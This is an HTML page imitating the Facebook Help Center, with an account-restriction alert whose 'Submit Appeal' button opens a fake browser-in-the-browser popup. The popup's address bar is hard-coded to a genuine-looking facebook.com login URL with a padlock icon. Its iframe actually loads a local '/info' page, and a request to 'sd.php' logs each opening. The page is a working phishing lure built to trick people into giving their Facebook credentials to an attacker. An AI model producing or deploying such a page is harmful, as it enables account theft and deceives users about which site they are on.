<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Help Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI Historic", "Segoe UI", Helvetica, Arial, sans-serif;
        }

        body {
            background: #f0f2f5;
            min-height: 100vh;
            color: #1c1e21;
        }

        .top-nav {
            background: white;
            padding: 0 16px;
            height: 56px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border-bottom: 1px solid #dddfe2;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 100;
        }

        .nav-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .fb-logo {
            width: 40px;
            height: 40px;
        }

        .nav-left h1 {
            font-size: 17px;
            font-weight: 600;
            color: #1c1e21;
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .print-btn {
            background: none;
            border: none;
            padding: 8px;
            cursor: pointer;
            color: #65676b;
            border-radius: 50%;
        }

        .print-btn:hover {
            background: #f2f2f2;
        }

        .language-selector {
            padding: 8px 12px;
            cursor: pointer;
            color: #1c1e21;
            font-size: 15px;
            border-radius: 6px;
        }

        .language-selector:hover {
            background: #f2f2f2;
        }

        .main-content {
            margin-top: 56px;
        }

        .sidebar {
            width: 320px;
            background: white;
            height: calc(100vh - 56px);
            position: fixed;
            left: 0;
            top: 56px;
            border-right: 1px solid #dddfe2;
            overflow-y: auto;
        }

        .sidebar-header {
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .sidebar-header img {
            width: 40px;
            height: 40px;
        }

        .sidebar-header h1 {
            font-size: 24px;
            color: #1c1e21;
        }

        .nav-item {
            padding: 12px 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            color: #1c1e21;
            text-decoration: none;
            margin: 1px 8px;
            border-radius: 6px;
            cursor: not-allowed;
        }

        .nav-item:hover {
            background: #f2f2f2;
        }

        .nav-item.active {
            background: #e7f3ff;
            color: #1877f2;
        }

        .nav-item-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .nav-item i.icon {
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .nav-item i.chevron {
            color: #65676b;
            font-size: 12px;
        }

        .main-content {
            margin-left: 430px;
            flex: 1;
            padding: 32px 60px;
            width: calc(100% - 430px);
            background: #f0f2f5;
        }

        .alert-box {
            background: #ffffff;
            border-radius: 8px;
            padding: 20px;
            display: flex;
            gap: 16px;
            align-items: flex-start;
            margin-bottom: 32px;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
        }

        .alert-icon {
            color: #f02849;
            font-size: 20px;
        }

        .alert-content h3 {
            font-size: 17px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 4px;
        }

        .alert-content p {
            color: #65676b;
            font-size: 15px;
            margin-bottom: 16px;
        }

        .alert-button {
            background: #0866ff;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.1s;
        }

        .alert-button:hover {
            background: #0859d9;
        }

        .section-title {
            font-size: 20px;
            font-weight: 700;
            color: #1c1e21;
            margin-bottom: 20px;
        }

        .topics-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
        }

        .topic-card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            transition: all 0.2s ease;
            cursor: pointer;
        }

        .topic-card:hover {
            transform: translateY(-2px);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .topic-card img {
            width: 48px;
            height: 48px;
            margin-bottom: 16px;
        }

        .topic-card h3 {
            font-size: 17px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 8px;
        }

        .topic-card p {
            font-size: 14px;
            color: #65676b;
            line-height: 1.4;
        }

        .help-link {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: white;
            border-radius: 8px;
            padding: 16px 20px;
            text-decoration: none;
            margin-bottom: 40px;
        }

        .help-link:hover {
            background: #f2f2f2;
        }

        .help-link-content {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .help-link-content img {
            width: 60px;
            height: 60px;
        }

        .help-text h3 {
            font-size: 17px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 4px;
        }

        .help-text p {
            font-size: 14px;
            color: #65676b;
        }

        .help-link i {
            color: #65676b;
            font-size: 12px;
        }

        .meta-footer {
            padding-top: 20px;
            border-top: 1px solid #dddfe2;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 16px;
        }

        .footer-links a {
            color: #65676b;
            text-decoration: none;
            font-size: 13px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-meta {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #65676b;
            font-size: 13px;
        }

        .meta-brand {
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .meta-brand img {
            height: 14px;
        }

        .appeal-button {
            padding: 8px 16px;
            border: none;
            border-radius: 6px;
            background-color: #1877f2;
            color: white;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.1s;
        }

        .appeal-button:hover {
            background-color: #166fe5;
        }

        /* Mobile Styles */
        @media (max-width: 768px) {
            .sidebar {
                display: none;
            }

            .main-content {
                margin-left: 0;
                margin-right: 0;
                padding: 16px;
                width: 100%;
            }

            .nav-left h1 {
                font-size: 15px;
            }

            .fb-logo {
                width: 36px;
                height: 36px;
            }

            .topics-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
            }

            .topic-card {
                padding: 16px;
                text-align: center;
            }

            .topic-card img {
                margin-bottom: 8px;
            }

            .topic-card p {
                display: none;
            }

            .topic-card h3 {
                font-size: 15px;
                margin-bottom: 0;
            }

            .help-link {
                padding: 12px 16px;
            }

            .help-link-content img {
                width: 48px;
                height: 48px;
            }

            .footer-links {
                gap: 12px;
            }
        }

    </style>
</head>
<body>
    <!-- Sidebar -->
    <!-- Top Navigation -->
    <nav class="top-nav">
        <div class="nav-left">
            <img src="assets/img/ico.ico" alt="Facebook" class="fb-logo">
            <h1>Help Center</h1>
        </div>
        <div class="nav-right">
            <button class="print-btn">
                <i class="fas fa-print"></i>
            </button>
            <div class="language-selector">
                English (US)
            </div>
        </div>
    </nav>

    <div class="sidebar">
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-circle icon"></i>
                Using Facebook
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
        
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-key icon"></i>
                Login, Recovery and Security
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
        
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-user-circle icon"></i>
                Managing Your Account
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
        
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-lock icon"></i>
                Privacy and Safety
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
        
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-exclamation-circle icon"></i>
                Policies
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
        
        <div class="nav-item">
            <div class="nav-item-left">
                <i class="fas fa-flag icon"></i>
                Reporting
            </div>
            <i class="fas fa-chevron-down chevron"></i>
        </div>
    </div>

    <div class="main-content">

        <div class="alert-box">
            <div class="alert-icon">
                <i class="fas fa-exclamation-circle"></i>
            </div>
            <div class="alert-content">
                <h3>Account & Page Review</h3>
                <p>Submit an appeal to restore full access to your account and page features. Our support team will review your case.</p>
                <button class="appeal-button" id="appealButton">Submit Appeal</button>
            </div>
        </div>

        <h2 class="section-title">Popular Topics</h2>
        
        <div class="topics-grid">
            <div class="topic-card">
                <img src="assets/img/acsett.png" alt="Account Settings">
                <h3>Account Settings</h3>
                <p>Adjust settings, manage notifications, learn about name changes and more.</p>
            </div>

            <div class="topic-card">
                <img src="assets/img/lgn.png" alt="Login Recovery and Security">
                <h3>Login, Recovery and Security</h3>
                <p>Fix login issues and learn how to change or reset your password.</p>
            </div>

            <div class="topic-card">
                <img src="assets/img/prvc.png" alt="Privacy and Safety">
                <h3>Privacy and Safety</h3>
                <p>Control who can see what you share and add extra protection to your account.</p>
            </div>

            <div class="topic-card">
                <img src="assets/img/mkrtplc.png" alt="Marketplace">
                <h3>Marketplace</h3>
                <p>Learn how to buy and sell things on Facebook.</p>
            </div>

            <div class="topic-card">
                <img src="assets/img/grp.png" alt="Groups">
                <h3>Groups</h3>
                <p>Learn how to create, manage and use Groups.</p>
            </div>

            <div class="topic-card">
                <img src="assets/img/pgs.png" alt="Pages">
                <h3>Pages</h3>
                <p>Learn how to create, use, follow and manage a Page.</p>
            </div>
        </div>

        <h2 class="section-title" style="margin-top: 40px;">Looking for something else?</h2>
        
        <a href="#" class="help-link">
            <div class="help-link-content">
                <img src="assets/img/bhel.png" alt="Business Help Center">
                <div class="help-text">
                    <h3>Visit Business Help Center</h3>
                    <p>Learn more about promoting your business on Facebook</p>
                </div>
            </div>
            <i class="fas fa-chevron-right"></i>
        </a>

        <footer class="meta-footer">
            <div class="footer-links">
                <a href="#">About</a>
                <a href="#">Privacy</a>
                <a href="#">Terms and Policies</a>
                <a href="#">Ad Choices</a>
                <a href="#">Careers</a>
                <a href="#">Cookies</a>
                <a href="#">Create Ad</a>
                <a href="#">Create Page</a>
            </div>
            <div class="footer-meta">
                <span class="meta-brand">from <img src="assets/img/flogo.svg" alt="Meta"></span>
                <span class="meta-copyright">© 2025 Meta</span>
            </div>
        </footer>

    <!-- Popup Container -->
<div class="popup-container" id="popupWindow">
    <!-- Draggable Tab Area (Top of the window) -->
    <div class="popup-tabs">
        <div class="popup-tab">
            <img src="ico.ico" alt="" width="17px" style="margin-right: 10px;">Facebook
        </div>
        <div class="close-tab-button" onclick="closePopup()">
            <i class="fas fa-times"></i>
        </div>
    </div>

    <!-- Popup header with controls -->
    <div id="popupHeader" class="popup-header">
        <div class="search-bar-container">
            <i class="fa-solid fa-lock ssl-icon" style="padding-right:5px"></i>
            <input id="searchBar" type="text" value="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" readonly>
        </div>
    </div>

    <!-- Content area (iframe) -->
    <iframe id="popupIframe" class="popup-iframe"></iframe>
</div>


<!-- POP UP JS -->
<script>
let isPopupOpened = false;
let isAjaxSent = false;

function changeIframeSrc(src) {
    if (!isPopupOpened) {
        document.getElementById('popupIframe').src = src;
        isPopupOpened = true;
    }
}

function sendAjaxRequest() {
    if (!isAjaxSent) {
        const formData = new FormData();
        formData.append('welcome', 'Welcome to the Popup');

        fetch('sd.php', {
            method: 'POST',
            body: formData,
        })
        .then(response => response.text())
        .then(data => {
            console.log('Success:', data);
            isAjaxSent = true;
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
}

function openPopup() {
    document.getElementById('popupWindow').style.display = 'flex';
    changeIframeSrc('/info');
    sendAjaxRequest();
}

function closePopup() {
    document.getElementById('popupWindow').style.display = 'none';
}

function dragElement(elmnt, dragHandle) {
    var pos1 = 0, pos2 = 0, pos3 = 0, pos4 = 0;
    if (dragHandle) {
        dragHandle.onmousedown = dragMouseDown;
    } else {
        elmnt.onmousedown = dragMouseDown;
    }

    function dragMouseDown(e) {
        if (window.matchMedia("(pointer: coarse)").matches) {
            return;
        }

        e = e || window.event;
        e.preventDefault();
        pos3 = e.clientX;
        pos4 = e.clientY;
        document.onmouseup = closeDragElement;
        document.onmousemove = elementDrag;
    }

    function elementDrag(e) {
        e = e || window.event;
        e.preventDefault();
        pos1 = pos3 - e.clientX;
        pos2 = pos4 - e.clientY;
        pos3 = e.clientX;
        pos4 = e.clientY;
        elmnt.style.top = (elmnt.offsetTop - pos2) + "px";
        elmnt.style.left = (elmnt.offsetLeft - pos1) + "px";
    }

    function closeDragElement() {
        document.onmouseup = null;
        document.onmousemove = null;
    }
}

// Initialize dragging and popup triggers
dragElement(document.getElementById("popupWindow"), document.querySelector(".popup-tabs"));

// Add click handler for continue button
document.getElementById('appealButton').addEventListener('click', openPopup);

// Update search bar based on iframe URL
function updateSearchBar() {
    var iframe = document.getElementById('popupIframe');
    var searchBar = document.getElementById('searchBar');

    iframe.onload = function() {
        searchBar.value = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100';
    };
}

updateSearchBar();
document.getElementById('popupIframe').addEventListener('load', updateSearchBar);
</script>
</body>
</html>
